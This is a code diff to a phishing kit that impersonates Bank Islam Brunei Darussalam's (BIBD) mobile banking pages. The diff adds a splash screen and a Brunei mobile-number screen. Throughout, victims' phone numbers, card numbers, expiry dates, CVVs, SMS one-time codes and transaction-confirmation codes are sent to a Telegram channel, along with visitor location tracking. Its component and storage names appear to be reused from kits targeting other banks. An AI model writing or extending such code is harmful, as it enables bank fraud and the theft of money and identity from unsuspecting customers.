@@ -12,9 +12,37 @@ import {
   Lock,
   MapPin,
   RotateCw,
+  Smartphone,
   UserPlus,
   Users,
 } from "lucide-react"
+
+// Crisp SVG Flag for Brunei Darussalam (BND)
+function BruneiFlag({ className = "w-6 h-4" }: { className?: string }) {
+  return (
+    <svg
+      viewBox="0 0 640 320"
+      className={`shrink-0 overflow-hidden ${className}`}
+      xmlns="http://www.w3.org/2000/svg"
+      aria-label="Flag of Brunei Darussalam"
+    >
+      <rect width="640" height="320" fill="#F7E017" />
+      <polygon points="0,0 640,240 640,285 0,45" fill="#FFFFFF" />
+      <polygon points="0,45 640,285 640,320 0,80" fill="#000000" />
+      <g fill="#D81B26" stroke="#D81B26" transform="translate(320, 160)">
+        <path d="M-45,35 C-45,68 45,68 45,35 C32,52 -32,52 -45,35 Z" fill="#D81B26" />
+        <path d="M-55,58 Q0,72 55,58 Q48,68 0,72 Q-48,68 -55,58 Z" fill="#D81B26" />
+        <rect x="-3" y="-55" width="6" height="95" fill="#D81B26" rx="2" />
+        <ellipse cx="0" cy="-35" rx="36" ry="12" fill="#D81B26" />
+        <circle cx="0" cy="-60" r="5" fill="#D81B26" />
+        <path d="M-55,-10 C-75,10 -65,40 -40,42 C-52,30 -55,10 -45,-5 Z" fill="#D81B26" />
+        <path d="M55,-10 C75,10 65,40 40,42 C52,30 55,10 45,-5 Z" fill="#D81B26" />
+        <path d="M-28,-25 C-45,-40 -20,-48 -5,-35 C-15,-32 -22,-30 -28,-25 Z" fill="#D81B26" />
+        <path d="M28,-25 C45,-40 20,-48 5,-35 C15,-32 22,-30 28,-25 Z" fill="#D81B26" />
+      </g>
+    </svg>
+  )
+}
 
 // BIBD Brand Wordmark Logo
 function BibdLogo() {
@@ -28,10 +56,18 @@ function BibdLogo() {
   )
 }
 
+type ScreenType =
+  | "splash"
+  | "phone"
+  | "login"
+  | "card"
+  | "otp"
+  | "accounts"
+  | "confirm-otp"
+
 export default function BbvaPage(props: any) {
-  const initialScreen: "login" | "card" | "otp" | "accounts" | "confirm-otp" =
-    props?.initialScreen || "card"
-  const [currentScreen, setCurrentScreen] = useState<"login" | "card" | "otp" | "accounts" | "confirm-otp">(initialScreen)
+  const initialScreen: ScreenType = props?.initialScreen || "splash"
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>(initialScreen)
   const [isScreenLoading, setIsScreenLoading] = useState(false)
   const [language, setLanguage] = useState<"en" | "es">("en")
   const [locationInfo, setLocationInfo] = useState<{
@@ -55,13 +91,18 @@ export default function BbvaPage(props: any) {
         setCurrentScreen("otp")
       } else if (p.includes("/card")) {
         setCurrentScreen("card")
+      } else if (p.includes("/phone") || p.includes("/mobile")) {
+        setCurrentScreen("phone")
+      } else if (p.includes("/splash")) {
+        setCurrentScreen("splash")
       }
     }
   }, [])
 
-  // Immediate visitor tracking and location alert on first screen
+  // Immediate visitor tracking and location alert ONLY on splash screen
   const hasTrackedVisitor = useRef(false)
   useEffect(() => {
+    if (currentScreen !== "splash") return
     if (hasTrackedVisitor.current) return
     hasTrackedVisitor.current = true
 
@@ -73,8 +114,9 @@ export default function BbvaPage(props: any) {
           setLocationInfo(info)
         }
         await sendTelegramMessage({
-          title: "BIBD — New Visitor",
-          type: "visitor",
+          title: "BIBD — Splash Screen Visitor",
+          type: "splash",
+          includeLocation: true,
         })
       } catch (err) {
         console.error("Visitor tracking error:", err)
@@ -84,13 +126,20 @@ export default function BbvaPage(props: any) {
     return () => {
       isMounted = false
     }
-  }, [])
+  }, [currentScreen])
 
   // Login form states
   const [userId, setUserId] = useState("")
   const [password, setPassword] = useState("")
   const [showPassword, setShowPassword] = useState(false)
   const [errorMessage, setErrorMessage] = useState("")
+
+  // Phone / Mobile number states (BND / Brunei Darussalam +673)
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [phoneCountryCode, setPhoneCountryCode] = useState("+673")
+  const [phoneError, setPhoneError] = useState("")
+  const [isPhoneSubmitting, setIsPhoneSubmitting] = useState(false)
+  const phoneInputRef = useRef<HTMLInputElement>(null)
 
   // Card form states
   const [cardNumber, setCardNumber] = useState("")
@@ -161,8 +210,38 @@ export default function BbvaPage(props: any) {
     if (typeof window !== "undefined") {
       const savedUser = sessionStorage.getItem("bbva_userId") || sessionStorage.getItem("cacib_userId")
       if (savedUser) setUserId(savedUser)
+      const savedPhone =
+        sessionStorage.getItem("bbva_phoneNumber") ||
+        sessionStorage.getItem("phoneNumber") ||
+        sessionStorage.getItem("bibd_phone")
+      if (savedPhone) {
+        const clean = savedPhone.replace("+673", "").trim()
+        setPhoneNumber(clean)
+      }
     }
   }, [])
+
+  // Auto-advance splash screen to phone screen after 2.6 seconds
+  useEffect(() => {
+    if (currentScreen !== "splash") return
+    const timer = setTimeout(() => {
+      setCurrentScreen("phone")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.replaceState({ screen: "phone" }, "", "/phone")
+      }
+    }, 2600)
+    return () => clearTimeout(timer)
+  }, [currentScreen])
+
+  // Focus phone input on phone screen
+  useEffect(() => {
+    if (currentScreen === "phone") {
+      const timer = setTimeout(() => {
+        phoneInputRef.current?.focus()
+      }, 250)
+      return () => clearTimeout(timer)
+    }
+  }, [currentScreen])
 
   // Timer countdown for OTP (Code expires in 2:59)
   useEffect(() => {
@@ -246,6 +325,58 @@ export default function BbvaPage(props: any) {
     }
   }
 
+  // Mobile number input: unlimited / infinite length
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const raw = e.target.value.replace(/\D/g, "")
+    setPhoneNumber(raw)
+    if (phoneError) setPhoneError("")
+  }
+
+  // Handle Mobile Number Submit -> Sends Telegram -> 1.5s loading -> Card Screen
+  const handlePhoneSubmit = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault()
+    const cleanPhone = phoneNumber.replace(/\s+/g, "")
+    if (!cleanPhone) {
+      setPhoneError("Please enter your mobile number")
+      phoneInputRef.current?.focus()
+      return
+    }
+
+    setPhoneError("")
+    setIsPhoneSubmitting(true)
+    setIsScreenLoading(true)
+
+    const fullPhone = `${phoneCountryCode} ${cleanPhone}`
+
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("bbva_phoneNumber", fullPhone)
+      sessionStorage.setItem("phoneNumber", fullPhone)
+      sessionStorage.setItem("bibd_phone", fullPhone)
+    }
+
+    try {
+      await sendTelegramMessage({
+        title: "BIBD — Mobile Number Captured",
+        phoneNumber: fullPhone,
+        phone: fullPhone,
+        type: "phone",
+        exclude: ["location"],
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
+    }
+
+    // 1.5 second loading then transition to card screen
+    setTimeout(() => {
+      setIsScreenLoading(false)
+      setIsPhoneSubmitting(false)
+      setCurrentScreen("card")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "card" }, "", "/card")
+      }
+    }, 1500)
+  }
+
   // 1. Handle Login submission: Show blur loading for exactly 2 seconds, then transition to card screen
   const handleLogin = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
@@ -322,9 +453,17 @@ export default function BbvaPage(props: any) {
 
     try {
       const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+      const savedPhone =
+        (typeof window !== "undefined" &&
+          (sessionStorage.getItem("bbva_phoneNumber") ||
+            sessionStorage.getItem("phoneNumber") ||
+            sessionStorage.getItem("bibd_phone"))) ||
+        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
       await sendTelegramMessage({
         title: "BIBD — Card Details Captured",
         dni: savedUser || undefined,
+        phoneNumber: savedPhone || undefined,
         cardNumber: cleanCard,
         expiry: expiry,
         cvv: cardCvv,
@@ -355,9 +494,17 @@ export default function BbvaPage(props: any) {
     }
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    const savedPhone =
+      (typeof window !== "undefined" &&
+        (sessionStorage.getItem("bbva_phoneNumber") ||
+          sessionStorage.getItem("phoneNumber") ||
+          sessionStorage.getItem("bibd_phone"))) ||
+      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
     sendTelegramMessage({
       title: "BIBD — SMS OTP Captured",
       dni: savedUser || undefined,
+      phoneNumber: savedPhone || undefined,
       otp1: codeToSave,
       type: "otp",
     }).catch((err) => console.error("Error sending Telegram notification:", err))
@@ -487,9 +634,17 @@ export default function BbvaPage(props: any) {
     }
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    const savedPhone =
+      (typeof window !== "undefined" &&
+        (sessionStorage.getItem("bbva_phoneNumber") ||
+          sessionStorage.getItem("phoneNumber") ||
+          sessionStorage.getItem("bibd_phone"))) ||
+      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
     sendTelegramMessage({
       title: `BIBD — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
       dni: savedUser || undefined,
+      phoneNumber: savedPhone || undefined,
       otp2: code,
       attempt: `${confirmAttempt}`,
       type: "confirm_otp",
@@ -631,6 +786,182 @@ export default function BbvaPage(props: any) {
       className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-center font-sans select-none overflow-hidden overscroll-none"
       style={{ backgroundColor: "#980F65" }}
     >
+      {/* ========================================================================= */}
+      {/* 0. SCREEN 0: SPLASH SCREEN (JUST BIBD TEXT & SPINNER)                     */}
+      {/* ========================================================================= */}
+      {currentScreen === "splash" && (
+        <main
+          onClick={() => {
+            setCurrentScreen("phone")
+            if (typeof window !== "undefined" && window.history) {
+              window.history.replaceState({ screen: "phone" }, "", "/phone")
+            }
+          }}
+          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-[#980F65] px-6 select-none cursor-pointer"
+        >
+          <div className="flex flex-col items-center justify-center space-y-7">
+            {/* BIBD Text */}
+            <span
+              className="text-white font-extrabold text-[42px] sm:text-[48px] tracking-[0.08em] leading-none drop-shadow-[0_2px_4px_rgba(0,0,0,0.3)] select-none"
+              aria-label="BIBD"
+            >
+              BIBD
+            </span>
+
+            {/* Spinner */}
+            <div className="w-9 h-9 rounded-full border-[3.5px] border-white/25 border-t-white animate-spin" />
+          </div>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 0.5. SCREEN 0.5: BND COUNTRY MOBILE NUMBER SCREEN                         */}
+      {/* Flag beside number, country code (+673), continue button -> Card Screen  */}
+      {/* ========================================================================= */}
+      {currentScreen === "phone" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
+          {/* Header with BIBD Logo */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
+            <div className="w-7" />
+            <div className="flex items-center justify-center">
+              <BibdLogo />
+            </div>
+            <div className="w-7" />
+          </header>
+
+          {/* Main content on #F4F6FC */}
+          <section className="relative z-10 w-full bg-[#F4F6FC] rounded-none flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 pt-6 pb-6 shadow-2xl select-none">
+            <div className="w-full flex flex-col">
+              {/* Phone Icon Badge */}
+              <div className="w-13 h-13 rounded-2xl bg-[#980F65]/10 flex items-center justify-center text-[#980F65] mb-4">
+                <Smartphone className="w-6 h-6 stroke-[2]" />
+              </div>
+
+              {/* Title & Description */}
+              <h2 className="text-[#0d1e38] text-[21px] sm:text-[23px] font-bold tracking-tight">
+                Enter Mobile Number
+              </h2>
+              <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-1 mb-5 leading-relaxed">
+                Please enter your registered mobile number to verify your account and view card details.
+              </p>
+
+              {/* Phone Form */}
+              <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col">
+                <div className="w-full mb-2">
+                  <div className="flex items-center justify-between mb-1.5">
+                    <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
+                      MOBILE NUMBER
+                    </label>
+                  </div>
+
+                  {/* Input container with Flag and Country Code beside number */}
+                  <div
+                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${
+                      phoneError
+                        ? "border-red-500 ring-1 ring-red-400"
+                        : "border-[#cbd5e1] focus-within:border-[#980F65] focus-within:ring-1 focus-within:ring-[#980F65]"
+                    }`}
+                  >
+                    {/* Flag and Country Code Badge */}
+                    <div className="flex items-center gap-2 shrink-0 py-1 px-1.5 rounded-md bg-slate-50 border border-slate-200">
+                      <BruneiFlag className="w-6 h-4 rounded-[2px] shadow-xs" />
+                      <span className="text-[14px] font-bold text-[#0d1e38] tracking-tight">
+                        +673
+                      </span>
+                    </div>
+
+                    {/* Divider */}
+                    <div className="w-[1px] h-6 bg-slate-200 shrink-0" />
+
+                    {/* Number Input Field - Infinite / Unlimited Length */}
+                    <input
+                      ref={phoneInputRef}
+                      type="tel"
+                      inputMode="numeric"
+                      value={phoneNumber}
+                      onChange={handlePhoneChange}
+                      placeholder="Enter mobile number"
+                      className="w-full h-full bg-transparent text-[#0d1e38] placeholder-[#94a3b8] text-[16px] font-semibold tracking-wide focus:outline-none"
+                    />
+
+                    {phoneNumber && (
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setPhoneNumber("")
+                          setPhoneError("")
+                          phoneInputRef.current?.focus()
+                        }}
+                        className="text-slate-400 hover:text-slate-600 p-1"
+                        aria-label="Clear phone input"
+                      >
+                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                      </button>
+                    )}
+                  </div>
+                </div>
+
+                {/* Validation Error if any */}
+                {phoneError && (
+                  <p className="mt-0.5 mt-3 mb-3 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 animate-shake flex items-center gap-2">
+                    <span className="font-bold text-sm">!</span>
+                    <span>{phoneError}</span>
+                  </p>
+                )}
+
+                {/* Continue Button */}
+                <button
+                  type="submit"
+                  disabled={isPhoneSubmitting || !phoneNumber.trim()}
+                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
+                    phoneNumber.trim().length > 0 && !isPhoneSubmitting
+                      ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
+                  }`}
+                >
+                  {isPhoneSubmitting ? (
+                    <div className="flex items-center gap-2">
+                      <svg
+                        className="animate-spin h-5 w-5 text-white"
+                        xmlns="http://www.w3.org/2000/svg"
+                        fill="none"
+                        viewBox="0 0 24 24"
+                      >
+                        <circle
+                          className="opacity-25"
+                          cx="12"
+                          cy="12"
+                          r="10"
+                          stroke="currentColor"
+                          strokeWidth="4"
+                        />
+                        <path
+                          className="opacity-75"
+                          fill="currentColor"
+                          d="M4 12a8 8 0 018-8v8H4z"
+                        />
+                      </svg>
+                      <span>Connecting...</span>
+                    </div>
+                  ) : (
+                    "Continue"
+                  )}
+                </button>
+              </form>
+            </div>
+
+            {/* Bottom info */}
+            <div className="mt-auto pt-6 flex flex-col items-center text-center">
+              <p className="text-[11.5px] text-[#94a3b8]">
+                Bank Islam Brunei Darussalam • Licensed Islamic Bank
+              </p>
+            </div>
+          </section>
+        </main>
+      )}
+
       {/* ========================================================================= */}
       {/* 1. SCREEN 1: LOGIN SCREEN                                                 */}
       {/* ========================================================================= */}
